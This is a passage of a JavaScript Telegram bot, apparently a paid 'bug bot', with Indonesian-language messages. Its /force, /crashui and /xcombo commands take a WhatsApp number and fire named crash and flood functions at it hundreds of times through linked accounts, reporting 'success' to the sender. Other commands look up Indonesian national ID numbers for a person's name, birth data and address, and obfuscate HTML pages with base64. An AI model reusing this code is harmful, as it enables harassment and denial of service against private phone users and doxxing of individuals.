    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 100; i++) {
      await blanktryaja(sock, jid);
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/force(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  // Validasi input
  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ <b>Example:</b> /force 6281234567890`, { parse_mode: "HTML" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const target = jid;
  const mention = "@" + formattedNumber;

  // Cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kakak! Tunggu ${cooldown} detik.`);
  }

  // Cek Premium
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ <b>Khusus pengguna Premium</b>\nSilakan minta akses dengan <code>/addprem</code>`,
      parse_mode: "HTML"
    });
  }

  // Cek koneksi WA
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    // Kirim pesan loading
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ⏳ Sedang mengirim...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m Target:", formattedNumber);

    // Serangan 20x
    for (let i = 0; i < 500; i++) {
      await ComboAttack(sock, target);
      await ForceClick(sock, target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await FaiqFcNoClick(target);
      await DelayFcJarr(sock, target);
      await eventFlowres(target);
      await eventFlowres(target);

      // Delay 100ms antar serangan (opsional, untuk stabilitas)
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim ke", formattedNumber);

    // Edit pesan jadi sukses
    await bot.editMessageCaption(`
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FORCE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/crashui(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  // Validasi input
  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ <b>Example:</b> /crashui 6281234567890`, { parse_mode: "HTML" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const target = jid;
  const mention = "@" + formattedNumber;

  // Cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kakak! Tunggu ${cooldown} detik.`);
  }

  // Cek Premium
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ <b>Khusus pengguna Premium</b>\nSilakan minta akses dengan <code>/addprem</code>`,
      parse_mode: "HTML"
    });
  }

  // Cek koneksi WA
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    // Kirim pesan loading
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ⏳ Sedang mengirim...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m Target:", formattedNumber);

    // Serangan 20x
    for (let i = 0; i < 100; i++) {
      await NotifUI(target);
        await callInvis(target, mention);
        await BlankUi(target);

      // Delay 100ms antar serangan (opsional, untuk stabilitas)
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim ke", formattedNumber);

    // Edit pesan jadi sukses
    await bot.editMessageCaption(`
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FORCE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/xcombo(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  // Validasi input
  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ <b>Example:</b> /xcombo 6281234567890`, { parse_mode: "HTML" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const target = jid;
  const mention = "@" + formattedNumber;

  // Cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Jeda dulu ya kakak! Tunggu ${cooldown} detik.`);
  }

  // Cek Premium
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ <b>Khusus pengguna Premium</b>\nSilakan minta akses dengan <code>/addprem</code>`,
      parse_mode: "HTML"
    });
  }

  // Cek koneksi WA
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    // Kirim pesan loading
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ⏳ Sedang mengirim...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m Target:", formattedNumber);

    // Serangan 20x
    for (let i = 0; i < 100; i++) {
      await comboyanz(sock, durationHours = 72);

      // Delay 100ms antar serangan (opsional, untuk stabilitas)
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim ke", formattedNumber);

    // Edit pesan jadi sukses
    await bot.editMessageCaption(`
<blockquote>
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FORCE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Hanya owner boleh
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nHanya owner yang bisa menambah admin.",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Example: /addadmin 6843967527.");
    }

    const userId = match[1].replace(/[^0-9]/g, '');

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Hanya owner boleh
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nHanya owner yang bisa menambah admin.",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Example: /addadmin 6843967527.");
    }

    const userId = match[1].replace(/[^0-9]/g, '');

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/listadmin/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = String(msg.from.id);

    // akses hanya owner
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nHanya owner yang bisa melihat daftar admin.",
            { parse_mode: "Markdown" }
        );
    }

    if (!adminUsers || adminUsers.length === 0) {
        return bot.sendMessage(chatId, "📌 Tidak ada admin terdaftar.", {
            parse_mode: "Markdown",
        });
    }

    let message = "```L I S T - A D M I N\n\n```";

    adminUsers.forEach((id, index) => {
        message += `${index + 1}. ID: \`${id}\`\n`;
    });

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/copilot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  try {
    // CEK INPUT
    if (!prompt) {
      return bot.sendMessage(chatId, "⚠️ *Masukkan prompt!*\nContoh:\n`/copilot jelaskan apa itu Node.js`", {
        parse_mode: "Markdown"
      });
    }

    // LOADING ANIMASI
    const frames = ["💬", "🔄", "💭", "🌀"];
    let i = 0;

    let loadMsg = await bot.sendMessage(chatId, `${frames[0]} Sedang memproses...`);

    let interval = setInterval(() => {
      i = (i + 1) % frames.length;
      bot.editMessageText(`${frames[i]} Tunggu sebentar...`, {
        chat_id: chatId,
        message_id: loadMsg.message_id
      });
    }, 450);

    // MINTA JAWABAN KE AI
    const ai = await copilotAI(prompt);

    clearInterval(interval);

    if (ai.error) {
      return bot.editMessageText(`❌ ${ai.error}`, {
        chat_id: chatId,
        message_id: loadMsg.message_id
      });
    }

    // EDIT MENJADI HASIL
    await bot.editMessageText("✅ AI selesai! Mengirim jawaban...", {
      chat_id: chatId,
      message_id: loadMsg.message_id
    });

    // KIRIM JAWABAN AI
    await bot.sendMessage(chatId, `🤖 *Copilot AI*\n\n${ai.answer}`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses AI.");
  }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});

bot.onText(/\/gethtml (.+)?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const url = match[1];
    
    if (!/^https?:\/\//.test(url)) 
        return bot.sendMessage(chatId, `Example: /gethtml https://Majestys.tzy.id`, {
        parse_mode: "HTML"
        });

    bot.sendMessage(chatId, `⚡ Proses mengambil file.`, {
    parse_mode: "HTML"
    });

    try {
        const res = await fetch(url);
        const contentLength = parseInt(res.headers.get("content-length") || "0");
        if (contentLength > 100 * 1024 * 1024)
            throw `File terlalu besar: ${contentLength} bytes`;

        const contentType = res.headers.get("content-type") || "";

        if (contentType.startsWith("image/")) {
            return bot.sendPhoto(chatId, url);
        }

        if (contentType.startsWith("video/")) {
            return bot.sendVideo(chatId, url);
        }

        if (contentType.startsWith("audio/")) {
            return bot.sendAudio(chatId, url, { caption: "Audio dari URL" });
        }

        const arrayBuffer = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);

        if (contentType.includes("text") || contentType.includes("json")) {
            let text = buffer.toString();

            if (text.length > 4096) {
    const htmlContent = text;

    return bot.sendDocument(
        chatId,
        Buffer.from(htmlContent, "utf-8"),
        { caption: "Hasil HTML dari URL" },
        { filename: "Majesty's.html", contentType: "text/html" }
    );
} else {
                return bot.sendMessage(chatId, text);
            }
        } else {
            return bot.sendDocument(
                chatId,
                buffer,
                { caption: "File dari URL" },
                { filename: "file.bin", contentType: contentType || "application/octet-stream" }
            );
        }

    } catch (err) {
        return bot.sendMessage(chatId, `❌ Gagal mengambil file: ` + err);
    }
});



bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  const target = match[1];
  if (!target) {
    return bot.sendMessage(chatId, "❗ Contoh: /trackip 8.8.8.8");
  }

  try {
    const res = await axios.get(
      `http://ip-api.com/json/${target}?fields=status,message,country,regionName,city,isp,org,as,query,lat,lon,timezone`
    );

    if (res.data.status !== "success") {
      return bot.sendMessage(
        chatId,
        `❌ Gagal melacak: ${res.data.message || "Unknown error"}`
      );
    }

    const d = res.data;

    const info = `
🌍 *IP Track Result*
━━━━━━━━━━━━━━
🔹 IP/Host: \`${d.query}\`
🏴 Country: ${d.country}
🏙️ Region: ${d.regionName}
🌆 City: ${d.city}
⏰ Timezone: ${d.timezone}

📡 ISP: ${d.isp}
🏢 Org: ${d.org}
🔖 ASN: ${d.as}

📍 Lokasi: [Google Maps](https://www.google.com/maps?q=${d.lat},${d.lon})
`;

    bot.sendMessage(chatId, info, {
      parse_mode: "Markdown",
      disable_web_page_preview: false
    });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Error: Tidak bisa mengambil data.");
  }
});

bot.onText(/\/nikparse(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1].trim();

  // Validasi input
  if (!nik) {
    return bot.sendMessage(chatId, "🪧 Format: /nikparse 1234567890283625");
  }

  if (!/^\d{16}$/.test(nik)) {
    return bot.sendMessage(chatId, "❌ ☇ NIK harus 16 digit angka");
  }

  // Kirim pesan menunggu
  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses pengecekan NIK...");

  // Fungsi buat format hasil
  const replyHTML = async (d) => {
    const get = (x) => x ?? "-";
    const caption = `
<blockquote><b>｢ ⸸ ｣ Majèsty's ↯ Võcius ♰ </b></blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
    `;

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML", disable_web_page_preview: true });
  };

  // === Mulai proses cek NIK ===
  try {
    const a1 = await axios.get(`https://api.akuari.my.id/national/nik?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000,
    });

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (err) {
    try {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
      }
    } catch {
      await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
    }
  } finally {
    // Hapus pesan "menunggu"
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}
  }
});
bot.onText(/\/enchtml/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user reply ke file .html
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ Silakan reply ke file .html yang ingin dienkripsi.");
  }

  const document = msg.reply_to_message.document;

  // Pastikan ekstensi file .html
  if (!document.file_name.endsWith(".html")) {
    return bot.sendMessage(chatId, "❌ File harus berekstensi .html!");
  }

  try {
    // Ambil file dari Telegram
    const fileId = document.file_id;
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${file.file_path}`;

    // Download isi file HTML
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    // Encode ke Base64
    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");

    // Template hasil enkripsi
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Vero.Vrl</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    // Simpan hasilnya
    const outputPath = path.join(__dirname, "encbyrazx.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    // Kirim balik file ke user
    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ Enc Html By Majesty's (🍁)",
    });

    // Hapus file setelah dikirim
    fs.unlinkSync(outputPath);
  } catch (error) {
    console.error("Error saat enkripsi:", error);
    bot.sendMessage(chatId, "❌ Terjadi error saat membuat file terenkripsi.");
  }
});
bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});
bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});
bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");

    const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result || !data.result.length) {
      return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
    }

    let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";

    data.result.slice(0, 10).forEach((item, i) => {
      caption += `*${i + 1}. ${item.title}*\n`;
      caption += `👤 ${item.artist}\n`;
      caption += `🕒 ${item.duration}\n`;
      caption += `🔗 [Buka Spotify](${item.url})\n\n`;
    });

    // Kirim cover + caption
    bot.sendPhoto(chatId, data.result[0].cover, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("Spotify Search Error:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
  }
});

bot.onText(/^\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) return bot.sendMessage(chatId, "⚠️ Contoh: /play snowchild");

  try {
    const wait = await bot.sendMessage(chatId, "🎧 Nyari lagunya bre...");

    // Search Spotify
    const searchApi = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const res = await axios.get(searchApi);

    if (!res.data.success || !res.data.result?.length) {
      return bot.editMessageText("❌ Lagu tidak ditemukan bre!", {
        chat_id: chatId,
        message_id: wait.message_id,
      });
    }

    const top = res.data.result[0];

    // ambil mp3 dari spotify v2
    const dl = await axios.get(
      `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(top.url)}`
    );

    const mp3 = dl.data?.data?.mp3DownloadLink;
    if (!mp3) throw new Error("Gagal ambil link mp3 bre!");

    // download buffer
    const buffer = await axios
      .get(mp3, { responseType: "arraybuffer" })
      .then((r) => Buffer.from(r.data));

    await bot.sendAudio(chatId, buffer, {
      title: top.title || "Unknown",
      performer: top.artist || "Unknown",
    });

    bot.deleteMessage(chatId, wait.message_id).catch(() => {});

  } catch (e) {
    bot.sendMessage(chatId, "❌ Error: " + e.message);
  }
});
bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
